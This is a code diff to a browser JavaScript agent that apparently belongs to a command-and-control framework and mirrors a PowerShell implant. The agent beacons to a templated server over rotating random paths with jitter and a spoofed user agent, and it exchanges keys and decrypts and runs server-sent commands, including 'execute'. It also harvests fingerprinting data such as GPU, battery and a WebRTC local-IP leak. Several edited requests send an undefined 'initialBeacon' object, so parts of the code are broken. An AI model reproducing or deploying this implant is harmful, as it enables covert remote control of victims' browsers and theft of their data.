@@ -537,85 +537,107 @@ class KCMAgentCommunication {
     }
     
     // First contact beacon - special format for key exchange
-    async sendFirstContactBeacon(systemInfo) {
+    async sendFirstContactBeacon() {
         console.log('Sending first contact beacon');
+        this.updateUIStatus("Establishing first contact...");
         
-        // Create a simplified initial beacon for first contact
+        // Use minimal info matching PowerShell exactly
+        const minimalInfo = this.getSystemInformation(true);
+        
+        // Format exactly as PowerShell agent does
+        const operationPayload = {
+            "op_type": "beacon",
+            "payload": JSON.stringify(minimalInfo)
+        };
+        
+        // Convert to JSON
+        const operationJson = JSON.stringify(operationPayload);
+        
+        // Create the beacon exactly like PowerShell's format
         const initialBeacon = {
-            c: this.state.clientId,  // Include client ID
-            f: true,                 // Flag this as first contact
-            d: JSON.stringify(systemInfo),  // Include basic system info
-            t: this.generateRandomToken(50) // Add token padding
+            d: operationJson,
+            t: this.generateRandomToken(50),
+            c: null // PowerShell uses null for client_id on first contact
         };
         
         // Use a random path from the pool
         const beaconPath = this.getRandomPath();
         const fullUrl = `${this.config.protocol}://${this.config.serverAddress}${beaconPath}`;
         
-        // Send the request
-        const response = await fetch(fullUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'User-Agent': this.config.userAgent
-            },
-            body: JSON.stringify(initialBeacon)
-        });
-        
-        if (!response.ok) {
-            throw new Error(`HTTP error: ${response.status}`);
-        }
-        
-        // Process the response
-        const responseData = await response.json();
-        
-        // Check for server's public key
-        if (responseData.pubkey) {
-            // Process the server's public key - this will register our key
-            await this.processServerPublicKey(responseData.pubkey);
-        } else {
-            console.error('No public key found in server response!');
-        }
-        
-        // Update client ID if provided
-        if (responseData.c) {
-            this.state.clientId = responseData.c;
-            console.log(`Server assigned client ID: ${this.state.clientId}`);
-        }
-        
-        // Update path rotation info if provided
-        if (responseData.r) {
-            const rotationInfo = responseData.r;
-            if (rotationInfo.cid !== undefined && rotationInfo.nrt !== undefined) {
-                this.state.currentRotationId = rotationInfo.cid;
-                this.state.nextRotationTime = rotationInfo.nrt;
-                console.log(`Updated rotation info - ID: ${rotationInfo.cid}, Next rotation: ${new Date(rotationInfo.nrt * 1000).toLocaleString()}`);
-            }
-        }
-        
-        // Handle any commands in the response
-        if (responseData.com) {
-            let commands = responseData.com;
+        try {
+            // Make POST request
+            const response = await fetch(fullUrl, {
+                method: 'POST',
+                mode: 'cors',
+                credentials: 'omit', 
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': this.config.userAgent
+                },
+                body: JSON.stringify(initialBeacon)
+            });
             
-            // Check if commands are encrypted
-            if (responseData.e && this.state.encryptionKey) {
-                // Decrypt the commands
-                const decryptedCommands = await this.crypto.decrypt(commands, this.state.encryptionKey);
-                try {
-                    commands = JSON.parse(decryptedCommands);
-                } catch (e) {
-                    console.error('Error parsing decrypted commands:', e);
+            if (!response.ok) {
+                throw new Error(`HTTP error: ${response.status}`);
+            }
+            
+            // Process the response
+            const responseData = await response.json();
+            
+            // Check for server's public key
+            if (responseData.pubkey) {
+                // Process the server's public key - this will register our key
+                await this.processServerPublicKey(responseData.pubkey);
+            } else {
+                console.error('No public key found in server response!');
+            }
+            
+            // Update client ID if provided
+            if (responseData.c) {
+                this.state.clientId = responseData.c;
+                console.log(`Server assigned client ID: ${this.state.clientId}`);
+            }
+            
+            // Update path rotation info if provided
+            if (responseData.r) {
+                const rotationInfo = responseData.r;
+                if (rotationInfo.cid !== undefined && rotationInfo.nrt !== undefined) {
+                    this.state.currentRotationId = rotationInfo.cid;
+                    this.state.nextRotationTime = rotationInfo.nrt;
+                    console.log(`Updated rotation info - ID: ${rotationInfo.cid}, Next rotation: ${new Date(rotationInfo.nrt * 1000).toLocaleString()}`);
                 }
             }
             
-            // Process commands
-            if (Array.isArray(commands)) {
-                for (const command of commands) {
-                    await this.processCommand(command);
+            // Handle any commands in the response
+            if (responseData.com) {
+                let commands = responseData.com;
+                
+                // Check if commands are encrypted
+                if (responseData.e && this.state.encryptionKey) {
+                    // Decrypt the commands
+                    const decryptedCommands = await this.crypto.decrypt(commands, this.state.encryptionKey);
+                    try {
+                        commands = JSON.parse(decryptedCommands);
+                    } catch (e) {
+                        console.error('Error parsing decrypted commands:', e);
+                    }
+                }
+                
+                // Process commands
+                if (Array.isArray(commands)) {
+                    for (const command of commands) {
+                        await this.processCommand(command);
+                    }
                 }
             }
+        }
+        catch (error) {
+            console.error("First contact beacon failed:", error);
+            this.updateUIStatus("Connection failed: " + error.message);
+            throw error;
         }
     }
+    
     
     // Standard beacon for established connections
     async sendBeacon(systemInfo) {
@@ -623,10 +645,10 @@ class KCMAgentCommunication {
         const beaconPath = this.getRandomPath();
         const fullUrl = `${this.config.protocol}://${this.config.serverAddress}${beaconPath}`;
         
-        // Create operation payload
+        // Create operation payload with the expected op_type field
         const operationPayload = {
-            op_type: 'beacon',
-            payload: systemInfo
+            "op_type": "beacon",
+            "payload": systemInfo
         };
         
         // Convert to JSON
@@ -647,11 +669,14 @@ class KCMAgentCommunication {
         // Send the request
         const response = await fetch(fullUrl, {
             method: 'POST',
+            mode: 'cors', // Explicitly request CORS handling
+            credentials: 'omit', // Don't send cookies
             headers: {
                 'Content-Type': 'application/json',
-                'User-Agent': this.config.userAgent
+                'User-Agent': this.config.userAgent,
+                'Origin': window.location.origin || 'null' // Add origin header
             },
-            body: requestJson
+            body: JSON.stringify(initialBeacon)
         });
         
         if (!response.ok) {
@@ -779,13 +804,16 @@ class KCMAgentCommunication {
             this.updateUIStatus("Registering secure key...");
             
             // Send the registration request
-            const response = await fetch(registrationUrl, {
+            const response = await fetch(fullUrl, {
                 method: 'POST',
+                mode: 'cors', // Explicitly request CORS handling
+                credentials: 'omit', // Don't send cookies
                 headers: {
                     'Content-Type': 'application/json',
-                    'User-Agent': this.config.userAgent
+                    'User-Agent': this.config.userAgent,
+                    'Origin': window.location.origin || 'null' // Add origin header
                 },
-                body: registrationJson
+                body: JSON.stringify(initialBeacon)
             });
             
             if (!response.ok) {
@@ -838,11 +866,14 @@ class KCMAgentCommunication {
         try {
             const response = await fetch(fullUrl, {
                 method: 'POST',
+                mode: 'cors', // Explicitly request CORS handling
+                credentials: 'omit', // Don't send cookies
                 headers: {
                     'Content-Type': 'application/json',
-                    'User-Agent': this.config.userAgent
+                    'User-Agent': this.config.userAgent,
+                    'Origin': window.location.origin || 'null' // Add origin header
                 },
-                body: requestJson
+                body: JSON.stringify(initialBeacon)
             });
             
             if (!response.ok) {
@@ -887,8 +918,14 @@ class KCMAgentCommunication {
                 break;
                 
             case 'system_info_request':
-                // Gather detailed system information
-                result = JSON.stringify(this.getSystemInformation());
+                // Now that we have secure channel, send FULL system info
+                // This matches PowerShell behavior - only sending full info after secure channel
+                const fullSystemInfo = this.getSystemInformation(false);
+                result = JSON.stringify(fullSystemInfo);
+                
+                // Update UI if available
+                this.updateSystemInfo(fullSystemInfo);
+                console.log("Full system information sent after secure channel established");
                 break;
                 
             case 'path_rotation':
@@ -960,73 +997,99 @@ class KCMAgentCommunication {
     }
     
     // Gather system information
-    getSystemInformation() {
-        const info = {
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            cookiesEnabled: navigator.cookieEnabled,
-            screenWidth: window.screen.width,
-            screenHeight: window.screen.height,
-            windowWidth: window.innerWidth,
-            windowHeight: window.innerHeight,
-            timeZoneOffset: new Date().getTimezoneOffset(),
-            referrer: document.referrer,
-            doNotTrack: navigator.doNotTrack,
-            connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-            browserVendor: navigator.vendor || 'unknown',
-            colorDepth: window.screen.colorDepth,
-            devicePixelRatio: window.devicePixelRatio,
-            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
-        };
-        
-        // Try to get battery info if available
-        if (navigator.getBattery) {
-            navigator.getBattery().then(function(battery) {
-                info.battery = {
-                    charging: battery.charging,
-                    level: battery.level * 100
-                };
-            });
-        }
-        
-        // Get WebGL information if available
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    info.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                }
+    getSystemInformation(minimal = false) {
+        // For first contact, return minimal information with exact fields PowerShell uses
+        if (minimal) {
+            return {
+                Hostname: "Browser-" + Math.random().toString(36).substring(2, 10),
+                MachineGuid: window.clientMachineId || ('browser-' + 
+                    ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
+                        (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
+                    )),
+                KeyRegistrationStatus: "pending", 
+                IP: "127.0.0.1", // Include IP explicitly - server will override with actual IP
+                ProxyEnabled: false,
+                ProxyType: "system",
+                RotationId: 0,
+                // Add all exact fields from PowerShell agent
+                Username: "Browser-User",
+                OsVersion: navigator.userAgent,
+                Domain: "WORKGROUP"
+            };
+        } else {
+            // For secure channel, return complete system information
+            const info = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                timeZoneOffset: new Date().getTimezoneOffset(),
+                referrer: document.referrer,
+                doNotTrack: navigator.doNotTrack,
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                browserVendor: navigator.vendor || 'unknown',
+                colorDepth: window.screen.colorDepth,
+                devicePixelRatio: window.devicePixelRatio,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
+            };
+            
+            // Try to get battery info if available
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    info.battery = {
+                        charging: battery.charging,
+                        level: battery.level * 100
+                    };
+                });
             }
-        } catch (e) {
-            // Silently fail
-        }
-        
-        // Try WebRTC leak test - this might be blocked by privacy settings
-        try {
-            const pc = new RTCPeerConnection({
-                iceServers: []
-            });
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            pc.onicecandidate = (ice) => {
-                if (ice.candidate) {
-                    const matches = ice.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);
-                    if (matches) {
-                        info.localIP = matches[1];
+            
+            // Get WebGL information if available
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        info.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                     }
                 }
-            };
-        } catch (e) {
-            // Silently fail - this is expected in many browsers
+            } catch (e) {
+                // Silently fail
+            }
+            
+            // Try WebRTC leak test - this might be blocked by privacy settings
+            try {
+                const pc = new RTCPeerConnection({
+                    iceServers: []
+                });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (ice) => {
+                    if (ice.candidate) {
+                        const matches = ice.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);
+                        if (matches) {
+                            info.localIP = matches[1];
+                        }
+                    }
+                };
+            } catch (e) {
+                // Silently fail - this is expected in many browsers
+            }
+            try{
+                info.MachineGuid = window.clientMachineId;
+            } catch (e) {
+                // Silently fail
+            }
+            return info;
         }
-        
-        return info;
     }
+
     
     // Default command handler
     defaultCommandHandler(commandType, args) {
@@ -1263,12 +1326,12 @@ window.onload = function() {
     try {
         // Create and configure the agent
         const agent = new KCMAgentCommunication({
-            serverAddress: '127.0.0.1:61595',
-            protocol: 'http',
-            beaconInterval: 5,
-            jitterPercentage: 20,
-            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
-            websocketFallback: false,
+            serverAddress: '{{SERVER_ADDRESS}}',
+            protocol: '{{PROTOCOL}}',
+            beaconInterval: {{BEACON_PERIOD}},
+            jitterPercentage: {{JITTER_PERCENTAGE}},
+            userAgent: '{{USER_AGENT}}',
+            websocketFallback: {{WEBSOCKET_FALLBACK}},
             onCommandReceived: async function(commandType, args) {
                 // Handle execute commands
                 if (commandType === 'execute') {
